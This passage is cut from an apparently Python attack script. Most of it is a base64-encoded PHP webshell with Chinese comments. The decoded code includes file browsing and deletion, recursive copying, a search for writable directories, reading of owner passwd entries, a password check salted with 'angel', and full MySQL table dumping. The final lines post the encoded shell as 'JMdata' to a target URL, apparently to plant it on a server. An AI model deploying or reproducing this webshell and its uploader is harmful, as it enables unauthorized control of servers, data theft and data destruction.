Rtb2RlICYgMDAwMDQpID8gJ3InIDogJy0nOwoJJHdvcmxkWyd3cml0ZSddID0gKCRtb2RlICYgMDAwMDIpID8gJ3cnIDogJy0nOwoJJHdvcmxkWydleGVjdXRlJ10gPSAoJG1vZGUgJiAwMDAwMSkgPyAneCcgOiAnLSc7CgoJaWYoICRtb2RlICYgMHg4MDAgKSB7JG93bmVyWydleGVjdXRlJ10gPSAoJG93bmVyWydleGVjdXRlJ109PSd4JykgPyAncycgOiAnUyc7fQoJaWYoICRtb2RlICYgMHg0MDAgKSB7JGdyb3VwWydleGVjdXRlJ10gPSAoJGdyb3VwWydleGVjdXRlJ109PSd4JykgPyAncycgOiAnUyc7fQoJaWYoICRtb2RlICYgMHgyMDAgKSB7JHdvcmxkWydleGVjdXRlJ10gPSAoJHdvcmxkWydleGVjdXRlJ109PSd4JykgPyAndCcgOiAnVCc7fQoKCXJldHVybiAkdHlwZS4kb3duZXJbJ3JlYWQnXS4kb3duZXJbJ3dyaXRlJ10uJG93bmVyWydleGVjdXRlJ10uJGdyb3VwWydyZWFkJ10uJGdyb3VwWyd3cml0ZSddLiRncm91cFsnZXhlY3V0ZSddLiR3b3JsZFsncmVhZCddLiR3b3JsZFsnd3JpdGUnXS4kd29ybGRbJ2V4ZWN1dGUnXTsKfQoKZnVuY3Rpb24gZ2V0VXNlcigkZmlsZSkJewoJaWYgKGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0cHd1aWQnKSkgewoJCSRhcnJheSA9IEBwb3NpeF9nZXRwd3VpZChAZmlsZW93bmVyKCRmaWxlKSk7CgkJaWYgKCRhcnJheSAmJiBpc19hcnJheSgkYXJyYXkpKSB7CgkJCXJldHVybiAnIC8gPGEgaHJlZj0iIyIgdGl0bGU9IlVzZXI6ICcuJGFycmF5WyduYW1lJ10uJyYjMTMmIzEwUGFzc3dkOiAnLiRhcnJheVsncGFzc3dkJ10uJyYjMTMmIzEwVWlkOiAnLiRhcnJheVsndWlkJ10uJyYjMTMmIzEwZ2lkOiAnLiRhcnJheVsnZ2lkJ10uJyYjMTMmIzEwR2Vjb3M6ICcuJGFycmF5WydnZWNvcyddLicmIzEzJiMxMERpcjogJy4kYXJyYXlbJ2RpciddLicmIzEzJiMxMFNoZWxsOiAnLiRhcnJheVsnc2hlbGwnXS4nIj4nLiRhcnJheVsnbmFtZSddLic8L2E+JzsKCQl9Cgl9CglyZXR1cm4gJyc7Cn0KCmZ1bmN0aW9uIGNvcHlfcGFzdGUoJGMsJGYsJGQpewoJaWYoaXNfZGlyKCRjLiRmKSl7CgkJbWtkaXIoJGQuJGYpOwoJCSRkaXJzID0gc2NhbmRpcigkYy4kZik7CgkJaWYgKCRkaXJzKSB7CgkJCSRkaXJzID0gYXJyYXlfZGlmZigkZGlycywgYXJyYXkoJy4uJywgJy4nKSk7CgkJCWZvcmVhY2ggKCRkaXJzIGFzICRmaWxlKSB7CgkJCQljb3B5X3Bhc3RlKCRjLiRmLicvJywkZmlsZSwgJGQuJGYuJy8nKTsKCQkJfQoJCX0KCX0gZWxzZWlmKGlzX2ZpbGUoJGMuJGYpKSB7CgkJY29weSgkYy4kZiwgJGQuJGYpOwoJfQp9Ci8vIOWIoOmZpOebruW9lQpmdW5jdGlvbiBkZWx0cmVlKCRkZWxkaXIpIHsKCSRkaXJzID0gQHNjYW5kaXIoJGRlbGRpcik7CglpZiAoJGRpcnMpIHsKCQkkZGlycyA9IGFycmF5X2RpZmYoJGRpcnMsIGFycmF5KCcuLicsICcuJykpOwoJCWZvcmVhY2ggKCRkaXJzIGFzICRmaWxlKSB7CgkJCWlmKChpc19kaXIoJGRlbGRpci4nLycuJGZpbGUpKSkgewoJCQkJQGNobW9kKCRkZWxkaXIuJy8nLiRmaWxlLDA3NzcpOwoJCQkJZGVsdHJlZSgkZGVsZGlyLicvJy4kZmlsZSk7CgkJCX0gZWxzZSB7CgkJCQlAY2htb2QoJGRlbGRpci4nLycuJGZpbGUsMDc3Nyk7CgkJCQlAdW5saW5rKCRkZWxkaXIuJy8nLiRmaWxlKTsKCQkJfQoJCX0KCQlAY2htb2QoJGRlbGRpciwwNzc3KTsKCQlyZXR1cm4gQHJtZGlyKCRkZWxkaXIpID8gMSA6IDA7Cgl9IGVsc2UgewoJCXJldHVybiAwOwoJfQp9CgovLyDooajmoLzooYzpl7TnmoTog4zmma/oibLmm7/mjaIKZnVuY3Rpb24gYmcoKSB7CglnbG9iYWwgJGJnYzsKCXJldHVybiAoJGJnYysrJTI9PTApID8gJ2FsdDEnIDogJ2FsdDInOwp9CgpmdW5jdGlvbiBjbXAoJGEsICRiKSB7CglnbG9iYWwgJHNvcnQ7CglpZihpc19udW1lcmljKCRhWyRzb3J0WzBdXSkpIHsKCQlyZXR1cm4gKCgkYVskc29ydFswXV0gPCAkYlskc29ydFswXV0pID8gLTEgOiAxKSooJHNvcnRbMV0/MTotMSk7Cgl9IGVsc2UgewoJCXJldHVybiBzdHJjbXAoJGFbJHNvcnRbMF1dLCAkYlskc29ydFswXV0pKigkc29ydFsxXT8xOi0xKTsKCX0KfQoKLy8g6I635Y+W5b2T5YmN55uu5b2V55qE5LiK57qn55uu5b2VCmZ1bmN0aW9uIGdldFVwUGF0aCgkY3dkKSB7CgkkcGF0aGRiID0gZXhwbG9kZSgnLycsICRjd2QpOwoJJG51bSA9IGNvdW50KCRwYXRoZGIpOwoJaWYgKCRudW0gPiAyKSB7CgkJdW5zZXQoJHBhdGhkYlskbnVtLTFdLCRwYXRoZGJbJG51bS0yXSk7Cgl9CgkkdXBwYXRoID0gaW1wbG9kZSgnLycsICRwYXRoZGIpLicvJzsKCSR1cHBhdGggPSBzdHJfcmVwbGFjZSgnLy8nLCAnLycsICR1cHBhdGgpOwoJcmV0dXJuICR1cHBhdGg7Cn0KCi8vIOajgOafpVBIUOmFjee9ruWPguaVsApmdW5jdGlvbiBnZXRjZmcoJHZhcm5hbWUpIHsKCSRyZXN1bHQgPSBnZXRfY2ZnX3ZhcigkdmFybmFtZSk7CglpZiAoJHJlc3VsdCA9PSAwKSB7CgkJcmV0dXJuICdObyc7Cgl9IGVsc2VpZiAoJHJlc3VsdCA9PSAxKSB7CgkJcmV0dXJuICdZZXMnOwoJfSBlbHNlIHsKCQlyZXR1cm4gJHJlc3VsdDsKCX0KfQoKLy8g6I635b6X5paH5Lu25omp5bGV5ZCNCmZ1bmN0aW9uIGdldGV4dCgkZmlsZSkgewoJJGluZm8gPSBwYXRoaW5mbygkZmlsZSk7CglyZXR1cm4gJGluZm9bJ2V4dGVuc2lvbiddOwp9CmZ1bmN0aW9uIEdldFdEaXJMaXN0KCRwYXRoKXsKCWdsb2JhbCAkZGlyZGF0YSwkaiwkd2ViX2N3ZDsKCSEkaiAmJiAkaj0xOwoJJGRpcnMgPSBAc2NhbmRpcigkcGF0aCk7CglpZiAoJGRpcnMpIHsKCQkkZGlycyA9IGFycmF5X2RpZmYoJGRpcnMsIGFycmF5KCcuLicsJy4nKSk7CgkJZm9yZWFjaCAoJGRpcnMgYXMgJGZpbGUpIHsKCQkJJGY9c3RyX3JlcGxhY2UoJy8vJywnLycsJHBhdGguJy8nLiRmaWxlKTsKCQkJaWYoaXNfZGlyKCRmKSl7CgkJCQlpZiAoaXNfd3JpdGFibGUoJGYpKSB7CgkJCQkJJGRpcmRhdGFbJGpdWydmaWxlbmFtZSddPScvJy5zdHJfcmVwbGFjZSgkd2ViX2N3ZCwnJywkZik7CgkJCQkJJGRpcmRhdGFbJGpdWydtdGltZSddPUBkYXRlKCdZLW0tZCBIOmk6cycsZmlsZW10aW1lKCRmKSk7CgkJCQkJJGRpcmRhdGFbJGpdWydjaG1vZCddPWdldENobW9kKCRmKTsKCQkJCQkkZGlyZGF0YVskal1bJ3Blcm0nXT1QZXJtc0NvbG9yKCRmKTsKCQkJCQkkZGlyZGF0YVskal1bJ293bmVyJ109Z2V0VXNlcigkZik7CgkJCQkJJGRpcmRhdGFbJGpdWydsaW5rJ109JGY7CgkJCQkJJGorKzsKCQkJCX0KCQkJCUdldFdEaXJMaXN0KCRmKTsKCQkJfQoJCX0KCQlyZXR1cm4gJGRpcmRhdGE7Cgl9IGVsc2UgewoJCXJldHVybiBhcnJheSgpOwoJfQp9CmZ1bmN0aW9uIHNpemVjb3VudCgkc2l6ZSkgewoJJHVuaXQgPSBhcnJheSgnQnl0ZXMnLCAnS0InLCAnTUInLCAnR0InLCAnVEInLCdQQicpOwoJZm9yICgkaSA9IDA7ICRzaXplID49IDEwMjQgJiYgJGkgPCA1OyAkaSsrKSB7CgkJJHNpemUgLz0gMTAyNDsKCX0KCXJldHVybiByb3VuZCgkc2l6ZSwgMikuJyAnLiR1bml0WyRpXTsKfQpmdW5jdGlvbiBwKCRzdHIpewoJZWNobyAkc3RyLiJcbiI7Cn0KCmZ1bmN0aW9uIG1ha2VoaWRlKCRuYW1lLCR2YWx1ZT0nJyl7CglwKCI8aW5wdXQgaWQ9XCIkbmFtZVwiIHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiJG5hbWVcIiB2YWx1ZT1cIiR2YWx1ZVwiIC8+Iik7Cn0KCmZ1bmN0aW9uIG1ha2VpbnB1dCgkYXJnID0gYXJyYXkoKSl7CgkkYXJnWydzaXplJ10gPSBpc3NldCgkYXJnWydzaXplJ10pICYmICRhcmdbJ3NpemUnXSA+IDAgPyAic2l6ZT1cIiRhcmdbc2l6ZV1cIiIgOiAic2l6ZT1cIjEwMFwiIjsKCSRhcmdbJ3R5cGUnXSA9IGlzc2V0KCRhcmdbJ3R5cGUnXSkgPyAkYXJnWyd0eXBlJ10gOiAndGV4dCc7CgkkYXJnWyd0aXRsZSddID0gaXNzZXQoJGFyZ1sndGl0bGUnXSkgPyAkYXJnWyd0aXRsZSddLic8YnIgLz4nIDogJyc7CgkkYXJnWydjbGFzcyddID0gaXNzZXQoJGFyZ1snY2xhc3MnXSkgPyAkYXJnWydjbGFzcyddIDogJ2lucHV0JzsKCSRhcmdbJ25hbWUnXSA9IGlzc2V0KCRhcmdbJ25hbWUnXSkgPyAkYXJnWyduYW1lJ10gOiAnJzsKCSRhcmdbJ3ZhbHVlJ10gPSBpc3NldCgkYXJnWyd2YWx1ZSddKSA/ICRhcmdbJ3ZhbHVlJ10gOiAnJzsKCWlmIChpc3NldCgkYXJnWyduZXdsaW5lJ10pKSBwKCc8cD4nKTsKCXAoIiRhcmdbdGl0bGVdPGlucHV0IGNsYXNzPVwiJGFyZ1tjbGFzc11cIiBuYW1lPVwiJGFyZ1tuYW1lXVwiIGlkPVwiJGFyZ1tuYW1lXVwiIHZhbHVlPVwiJGFyZ1t2YWx1ZV1cIiB0eXBlPVwiJGFyZ1t0eXBlXVwiICRhcmdbc2l6ZV0gLz4iKTsKCWlmIChpc3NldCgkYXJnWyduZXdsaW5lJ10pKSBwKCc8L3A+Jyk7Cn0KCmZ1bmN0aW9uIG1ha2VzZWxlY3QoJGFyZyA9IGFycmF5KCkpewoJJG9uY2hhbmdlID0gaXNzZXQoJGFyZ1snb25jaGFuZ2UnXSkgPyAnb25jaGFuZ2U9IicuJGFyZ1snb25jaGFuZ2UnXS4nIicgOiAnJzsKCSRhcmdbJ3RpdGxlJ10gPSBpc3NldCgkYXJnWyd0aXRsZSddKSA/ICRhcmdbJ3RpdGxlJ10gOiAnJzsKCSRhcmdbJ25hbWUnXSA9IGlzc2V0KCRhcmdbJ25hbWUnXSkgPyAkYXJnWyduYW1lJ10gOiAnJzsKCXAoIiRhcmdbdGl0bGVdIDxzZWxlY3QgY2xhc3M9XCJpbnB1dFwiIGlkPVwiJGFyZ1tuYW1lXVwiIG5hbWU9XCIkYXJnW25hbWVdXCIgJG9uY2hhbmdlPiIpOwoJCWlmIChpc19hcnJheSgkYXJnWydvcHRpb24nXSkpIHsKCQkJZm9yZWFjaCAoJGFyZ1snb3B0aW9uJ10gYXMgJGtleT0+JHZhbHVlKSB7CgkJCQlpZiAoJGFyZ1snc2VsZWN0ZWQnXT09JGtleSkgewoJCQkJCXAoIjxvcHRpb24gdmFsdWU9XCIka2V5XCIgc2VsZWN0ZWQ+JHZhbHVlPC9vcHRpb24+Iik7CgkJCQl9IGVsc2UgewoJCQkJCXAoIjxvcHRpb24gdmFsdWU9XCIka2V5XCI+JHZhbHVlPC9vcHRpb24+Iik7CgkJCQl9CgkJCX0KCQl9CglwKCI8L3NlbGVjdD4iKTsKfQpmdW5jdGlvbiBmb3JtaGVhZCgkYXJnID0gYXJyYXkoKSkgewoJIWlzc2V0KCRhcmdbJ21ldGhvZCddKSAmJiAkYXJnWydtZXRob2QnXSA9ICdwb3N0JzsKCSFpc3NldCgkYXJnWyduYW1lJ10pICYmICRhcmdbJ25hbWUnXSA9ICdmb3JtMSc7CgkkYXJnWydleHRyYSddID0gaXNzZXQoJGFyZ1snZXh0cmEnXSkgPyAkYXJnWydleHRyYSddIDogJyc7CgkkYXJnWydvbnN1Ym1pdCddID0gaXNzZXQoJGFyZ1snb25zdWJtaXQnXSkgPyAib25zdWJtaXQ9XCIkYXJnW29uc3VibWl0XVwiIiA6ICcnOwoJcCgiPGZvcm0gbmFtZT1cIiRhcmdbbmFtZV1cIiBpZD1cIiRhcmdbbmFtZV1cIiBhY3Rpb249XCIiLlNFTEYuIlwiIG1ldGhvZD1cIiRhcmdbbWV0aG9kXVwiICRhcmdbb25zdWJtaXRdICRhcmdbZXh0cmFdPiIpOwoJaWYgKGlzc2V0KCRhcmdbJ3RpdGxlJ10pKSB7CgkJcCgnPGgyPicuJGFyZ1sndGl0bGUnXS4nICZyYXF1bzs8L2gyPicpOwoJfQp9CgpmdW5jdGlvbiBtYWtldGV4dCgkYXJnID0gYXJyYXkoKSl7CgkkYXJnWyd0aXRsZSddID0gaXNzZXQoJGFyZ1sndGl0bGUnXSkgPyAkYXJnWyd0aXRsZSddLic8YnIgLz4nIDogJyc7CgkkYXJnWyduYW1lJ10gPSBpc3NldCgkYXJnWyduYW1lJ10pID8gJGFyZ1snbmFtZSddIDogJyc7CglwKCI8cD4kYXJnW3RpdGxlXTx0ZXh0YXJlYSBjbGFzcz1cImFyZWFcIiBpZD1cIiRhcmdbbmFtZV1cIiBuYW1lPVwiJGFyZ1tuYW1lXVwiIGNvbHM9XCIxMDBcIiByb3dzPVwiMjVcIj4kYXJnW3ZhbHVlXTwvdGV4dGFyZWE+PC9wPiIpOwp9CgpmdW5jdGlvbiBmb3JtZm9vdGVyKCRuYW1lID0gJycpewoJISRuYW1lICYmICRuYW1lID0gJ3N1Ym1pdCc7CglwKCc8cD48aW5wdXQgY2xhc3M9ImJ0IiBuYW1lPSInLiRuYW1lLiciIGlkPSInLiRuYW1lLiciIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlN1Ym1pdCI+PC9wPicpOwoJcCgnPC9mb3JtPicpOwp9CgpmdW5jdGlvbiBnb2JhY2soKXsKCWdsb2JhbCAkY3dkLCAkY2hhcnNldDsKCXAoJzxmb3JtIGFjdGlvbj0iJy5TRUxGLiciIG1ldGhvZD0icG9zdCI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0IiB2YWx1ZT0iZmlsZSIgLz48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjd2QiIHZhbHVlPSInLiRjd2QuJyIgLz48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjaGFyc2V0IiB2YWx1ZT0iJy4kY2hhcnNldC4nIiAvPjxwPjxpbnB1dCBjbGFzcz0iYnQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIGJhY2suLi4iPjwvcD48L2Zvcm0+Jyk7Cn0KCmZ1bmN0aW9uIGZvcm1mb290KCl7CglwKCc8L2Zvcm0+Jyk7Cn0KCmZ1bmN0aW9uIGVuY29kZV9wYXNzKCRwYXNzKSB7CgkkayA9ICdhbmdlbCc7CgkkcGFzcyA9IG1kNSgkay4kcGFzcyk7CgkkcGFzcyA9IG1kNSgkcGFzcy4kayk7CgkkcGFzcyA9IG1kNSgkay4kcGFzcy4kayk7CglyZXR1cm4gJHBhc3M7Cn0KCmZ1bmN0aW9uIHByKCRhKSB7CglwKCc8ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0O2JvcmRlcjoxcHggc29saWQgI2RkZDsiPjxwcmU+Jy5wcmludF9yKCRhKS4nPC9wcmU+PC9kaXY+Jyk7Cn0KCmNsYXNzIERCX015U1FMICB7CgoJdmFyICRxdWVyeWNvdW50ID0gMDsKCXZhciAkbGluazsKCXZhciAkY2hhcnNldGRiID0gYXJyYXkoKTsKCXZhciAkY2hhcnNldCA9ICcnOwoKCWZ1bmN0aW9uIGNvbm5lY3QoJGRiaG9zdCwgJGRidXNlciwgJGRicGFzcywgJGRibmFtZT0nJykgewoJCUBpbmlfc2V0KCdteXNxbC5jb25uZWN0X3RpbWVvdXQnLCA1KTsKCQlpZighJHRoaXMtPmxpbmsgPSBAbXlzcWxfY29ubmVjdCgkZGJob3N0LCAkZGJ1c2VyLCAkZGJwYXNzLCAxKSkgewoJCQkkdGhpcy0+aGFsdCgnQ2FuIG5vdCBjb25uZWN0IHRvIE15U1FMIHNlcnZlcicpOwoJCX0KCQlpZigkdGhpcy0+dmVyc2lvbigpID4gJzQuMScpIHsKCQkJJHRoaXMtPnNldGNoYXJzZXQoJHRoaXMtPmNoYXJzZXQpOwoJCX0KCQkkZGJuYW1lICYmIG15c3FsX3NlbGVjdF9kYigkZGJuYW1lLCAkdGhpcy0+bGluayk7Cgl9CglmdW5jdGlvbiBzZXRjaGFyc2V0KCRjaGFyc2V0KSB7CgkJaWYgKCRjaGFyc2V0ICYmICR0aGlzLT5jaGFyc2V0ZGJbJGNoYXJzZXRdKSB7CgkJCWlmKGZ1bmN0aW9uX2V4aXN0cygnbXlzcWxfc2V0X2NoYXJzZXQnKSkgewoJCQkJbXlzcWxfc2V0X2NoYXJzZXQoJHRoaXMtPmNoYXJzZXRkYlskY2hhcnNldF0sICR0aGlzLT5saW5rKTsKCQkJfSBlbHNlIHsKCQkJCSR0aGlzLT5xdWVyeSgiU0VUIGNoYXJhY3Rlcl9zZXRfY29ubmVjdGlvbj0nIi4kdGhpcy0+Y2hhcnNldGRiWyRjaGFyc2V0XS4iJywgY2hhcmFjdGVyX3NldF9yZXN1bHRzPSciLiR0aGlzLT5jaGFyc2V0ZGJbJGNoYXJzZXRdLiInLCBjaGFyYWN0ZXJfc2V0X2NsaWVudD1iaW5hcnkiKTsKCQkJfQoJCX0KCX0KCWZ1bmN0aW9uIHNlbGVjdF9kYigkZGJuYW1lKSB7CgkJcmV0dXJuIG15c3FsX3NlbGVjdF9kYigkZGJuYW1lLCAkdGhpcy0+bGluayk7Cgl9CglmdW5jdGlvbiBnZXRlcnJkZXNjKCkgewoJCXJldHVybiAoKCR0aGlzLT5saW5rKSA/IG15c3FsX2Vycm9yKCR0aGlzLT5saW5rKSA6IG15c3FsX2Vycm9yKCkpOwoJfQoJZnVuY3Rpb24gZ2V0ZXJybm8oKSB7CgkJcmV0dXJuIGludHZhbCgoJHRoaXMtPmxpbmspID8gbXlzcWxfZXJybm8oJHRoaXMtPmxpbmspIDogbXlzcWxfZXJybm8oKSk7Cgl9CglmdW5jdGlvbiBmZXRjaCgkcXVlcnksICRyZXN1bHRfdHlwZSA9IE1ZU1FMX0FTU09DKSB7IC8vTVlTUUxfTlVNCgkJcmV0dXJuIG15c3FsX2ZldGNoX2FycmF5KCRxdWVyeSwgJHJlc3VsdF90eXBlKTsKCX0KCWZ1bmN0aW9uIHF1ZXJ5KCRzcWwpIHsKCQkvL2VjaG8gJzxwIHN0eWxlPSJjb2xvcjojZjAwOyI+Jy4kc3FsLic8L3A+JzsKCQlpZighKCRxdWVyeSA9IG15c3FsX3F1ZXJ5KCRzcWwsICR0aGlzLT5saW5rKSkpIHsKCQkJJHRoaXMtPmhhbHQoJ015U1FMIFF1ZXJ5IEVycm9yJywgJHNxbCk7CgkJfQoJCSR0aGlzLT5xdWVyeWNvdW50Kys7CgkJcmV0dXJuICRxdWVyeTsKCX0KCWZ1bmN0aW9uIHF1ZXJ5X3Jlcygkc3FsKSB7CgkJJHJlcyA9ICcnOwoJCWlmKCEkcmVzID0gbXlzcWxfcXVlcnkoJHNxbCwgJHRoaXMtPmxpbmspKSB7CgkJCSRyZXMgPSAwOwoJCX0gZWxzZSBpZihpc19yZXNvdXJjZSgkcmVzKSkgewoJCQkkcmVzID0gMTsKCQl9IGVsc2UgewoJCQkkcmVzID0gMjsKCQl9CgkJJHRoaXMtPnF1ZXJ5Y291bnQrKzsKCQlyZXR1cm4gJHJlczsKCX0KCWZ1bmN0aW9uIG51bV9yb3dzKCRxdWVyeSkgewoJCSRxdWVyeSA9IG15c3FsX251bV9yb3dzKCRxdWVyeSk7CgkJcmV0dXJuICRxdWVyeTsKCX0KCWZ1bmN0aW9uIG51bV9maWVsZHMoJHF1ZXJ5KSB7CgkJJHF1ZXJ5ID0gbXlzcWxfbnVtX2ZpZWxkcygkcXVlcnkpOwoJCXJldHVybiAkcXVlcnk7Cgl9CglmdW5jdGlvbiBhZmZlY3RlZF9yb3dzKCkgewoJCXJldHVybiBteXNxbF9hZmZlY3RlZF9yb3dzKCR0aGlzLT5saW5rKTsKCX0KCWZ1bmN0aW9uIHJlc3VsdCgkcXVlcnksICRyb3cpIHsKCQkkcXVlcnkgPSBteXNxbF9yZXN1bHQoJHF1ZXJ5LCAkcm93KTsKCQlyZXR1cm4gJHF1ZXJ5OwoJfQoJZnVuY3Rpb24gZnJlZV9yZXN1bHQoJHF1ZXJ5KSB7CgkJJHF1ZXJ5ID0gbXlzcWxfZnJlZV9yZXN1bHQoJHF1ZXJ5KTsKCQlyZXR1cm4gJHF1ZXJ5OwoJfQoJZnVuY3Rpb24gdmVyc2lvbigpIHsKCQlyZXR1cm4gbXlzcWxfZ2V0X3NlcnZlcl9pbmZvKCR0aGlzLT5saW5rKTsKCX0KCWZ1bmN0aW9uIGNsb3NlKCkgewoJCXJldHVybiBteXNxbF9jbG9zZSgkdGhpcy0+bGluayk7Cgl9CglmdW5jdGlvbiBoYWx0KCRtc2cgPScnKXsKCQllY2hvICI8aDI+Ii5odG1sc3BlY2lhbGNoYXJzKCRtc2cpLiI8L2gyPlxuIjsKCQllY2hvICI8cCBjbGFzcz1cImJcIj5NeXNxbCBlcnJvciBkZXNjcmlwdGlvbjogIi5odG1sc3BlY2lhbGNoYXJzKCR0aGlzLT5nZXRlcnJkZXNjKCkpLiI8L3A+XG4iOwoJCWVjaG8gIjxwIGNsYXNzPVwiYlwiPk15c3FsIGVycm9yIG51bWJlcjogIi4kdGhpcy0+Z2V0ZXJybm8oKS4iPC9wPlxuIjsKCQlleGl0OwoJfQoJZnVuY3Rpb24gZ2V0X2ZpZWxkc19tZXRhKCRyZXN1bHQpIHsKCQkkZmllbGRzID0gYXJyYXkoKTsKCQkkbnVtX2ZpZWxkcyA9ICR0aGlzLT5udW1fZmllbGRzKCRyZXN1bHQpOwoJCWZvciAoJGkgPSAwOyAkaSA8ICRudW1fZmllbGRzOyAkaSsrKSB7CgkJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCRyZXN1bHQsICRpKTsKCQkJJGZpZWxkc1tdID0gJGZpZWxkOwoJCX0KCQlyZXR1cm4gJGZpZWxkczsKCX0KCWZ1bmN0aW9uIHNxbEFkZFNsYXNoZXMoJHMgPSAnJyl7CgkJJHMgPSBzdHJfcmVwbGFjZSgnXFwnLCAnXFxcXCcsICRzKTsKCQkkcyA9IHN0cl9yZXBsYWNlKCdcJycsICdcJ1wnJywgJHMpOwoJCXJldHVybiAkczsKCX0KCS8vIOWkh+S7veaVsOaNruW6kwoJZnVuY3Rpb24gc3FsZHVtcCgkdGFibGUsICRmcD0wKSB7CgkJJGNybGYgPSAoSVNfV0lOID8gIlxyXG4iIDogIlxuIik7CgkJJHNlYXJjaCA9IGFycmF5KCJceDAwIiwgIlx4MGEiLCAiXHgwZCIsICJceDFhIik7IC8vXHgwOFxceDA5LCBub3QgcmVxdWlyZWQKCQkkcmVwbGFjZSA9IGFycmF5KCdcMCcsICdcbicsICdccicsICdcWicpOwoKCQlpZiAoaXNzZXQoJHRoaXMtPmNoYXJzZXQpICYmIGlzc2V0KCR0aGlzLT5jaGFyc2V0ZGJbJHRoaXMtPmNoYXJzZXRdKSkgewoJCQkkc2V0X25hbWVzID0gJHRoaXMtPmNoYXJzZXRkYlskdGhpcy0+Y2hhcnNldF07CgkJfSBlbHNlIHsKCQkJJHNldF9uYW1lcyA9ICR0aGlzLT5jaGFyc2V0ZGJbJ3V0Zi04J107CgkJfQoJCSR0YWJsZWR1bXAgPSAnU0VUIFNRTF9NT0RFPSJOT19BVVRPX1ZBTFVFX09OX1pFUk8iOycuJGNybGYuJGNybGY7CgkJJHRhYmxlZHVtcCAuPSAnLyohNDAxMDEgU0VUIEBPTERfQ0hBUkFDVEVSX1NFVF9DTElFTlQ9QEBDSEFSQUNURVJfU0VUX0NMSUVOVCAqLzsnLiRjcmxmCgkJCSAgIC4gJy8qITQwMTAxIFNFVCBAT0xEX0NIQVJBQ1RFUl9TRVRfUkVTVUxUUz1AQENIQVJBQ1RFUl9TRVRfUkVTVUxUUyAqLzsnLiRjcmxmCgkJCSAgIC4gJy8qITQwMTAxIFNFVCBAT0xEX0NPTExBVElPTl9DT05ORUNUSU9OPUBAQ09MTEFUSU9OX0NPTk5FQ1RJT04gKi87Jy4kY3JsZgoJCQkgICAuICcvKiE0MDEwMSBTRVQgTkFNRVMgJyAuICRzZXRfbmFtZXMgLiAnICovOycuJGNybGYuJGNybGY7CgoJCSR0YWJsZWR1bXAgLj0gIkRST1AgVEFCTEUgSUYgRVhJU1RTIGAkdGFibGVgOyIuJGNybGY7CgkJJHJlcyA9ICR0aGlzLT5xdWVyeSgiU0hPVyBDUkVBVEUgVEFCTEUgJHRhYmxlIik7CgkJJGNyZWF0ZSA9ICR0aGlzLT5mZXRjaCgkcmVzLCBNWVNRTF9OVU0pOwoJCSR0YWJsZWR1bXAgLj0gJGNyZWF0ZVsxXS4nOycuJGNybGYuJGNybGY7CgkJaWYgKHN0cnBvcygkdGFibGVkdW1wLCAiKFxyXG4gIikpIHsKCQkJJHRhYmxlZHVtcCA9IHN0cl9yZXBsYWNlKCJcclxuIiwgJGNybGYsICR0YWJsZWR1bXApOwoJCX0gZWxzZWlmIChzdHJwb3MoJHRhYmxlZHVtcCwgIihcbiAiKSkgewoJCQkkdGFibGVkdW1wID0gc3RyX3JlcGxhY2UoIlxuIiwgJGNybGYsICR0YWJsZWR1bXApOwoJCX0gZWxzZWlmIChzdHJwb3MoJHRhYmxlZHVtcCwgIihcciAiKSkgewoJCQkkdGFibGVkdW1wID0gc3RyX3JlcGxhY2UoIlxyIiwgJGNybGYsICR0YWJsZWR1bXApOwoJCX0KCQl1bnNldCgkY3JlYXRlKTsKCgkJaWYgKCRmcCkgewoJCQlmd3JpdGUoJGZwLCR0YWJsZWR1bXApOwoJCX0gZWxzZSB7CgkJCWVjaG8gJHRhYmxlZHVtcDsKCQl9CgkJJHRhYmxlZHVtcCA9ICcnOwoJCSRyb3dzID0gJHRoaXMtPnF1ZXJ5KCJTRUxFQ1QgKiBGUk9NICR0YWJsZSIpOwoJCSRmaWVsZHNfY250ID0gJHRoaXMtPm51bV9maWVsZHMoJHJvd3MpOwoJCSRmaWVsZHNfbWV0YSA9ICR0aGlzLT5nZXRfZmllbGRzX21ldGEoJHJvd3MpOwoKCQl3aGlsZSAoJHJvdyA9ICR0aGlzLT5mZXRjaCgkcm93cywgTVlTUUxfTlVNKSkgewoJCQlmb3IgKCRqID0gMDsgJGogPCAkZmllbGRzX2NudDsgJGorKykgewoJCQkJaWYgKCFpc3NldCgkcm93WyRqXSkgfHwgaXNfbnVsbCgkcm93WyRqXSkpIHsKCQkJCQkkdmFsdWVzW10gPSAnTlVMTCc7CgkJCQl9IGVsc2VpZiAoJGZpZWxkc19tZXRhWyRqXS0+bnVtZXJpYyAmJiAkZmllbGRzX21ldGFbJGpdLT50eXBlICE9ICd0aW1lc3RhbXAnICYmICEkZmllbGRzX21ldGFbJGpdLT5ibG9iKSB7CgkJCQkJJHZhbHVlc1tdID0gJHJvd1skal07CgkJCQl9IGVsc2VpZiAoJGZpZWxkc19tZXRhWyRqXS0+YmxvYikgewoJCQkJCWlmIChlbXB0eSgkcm93WyRqXSkgJiYgJHJvd1skal0gIT0gJzAnKSB7CgkJCQkJCSR2YWx1ZXNbXSA9ICdcJ1wnJzsKCQkJCQl9IGVsc2UgewoJCQkJCQkkdmFsdWVzW10gPSAnMHgnLmJpbjJoZXgoJHJvd1skal0pOwoJCQkJCX0KCQkJCX0gZWxzZSB7CgkJCQkJJHZhbHVlc1tdID0gJ1wnJy5zdHJfcmVwbGFjZSgkc2VhcmNoLCAkcmVwbGFjZSwgJHRoaXMtPnNxbEFkZFNsYXNoZXMoJHJvd1skal0pKS4nXCcnOwoJCQkJfQoJCQl9CgkJCSR0YWJsZWR1bXAgPSAnSU5TRVJUIElOVE8gYCcuJHRhYmxlLidgIFZBTFVFUygnLmltcGxvZGUoJywgJywgJHZhbHVlcykuJyk7Jy4kY3JsZjsKCQkJdW5zZXQoJHZhbHVlcyk7CgkJCWlmICgkZnApIHsKCQkJCWZ3cml0ZSgkZnAsJHRhYmxlZHVtcCk7CgkJCX0gZWxzZSB7CgkJCQllY2hvICR0YWJsZWR1bXA7CgkJCX0KCQl9CgkJJHRoaXMtPmZyZWVfcmVzdWx0KCRyb3dzKTsKCX0KfQo/Pg=='

JMreq = urllib2.urlopen(JMurl, 'JMdata=' + JMdata)
content = JMreq.read()

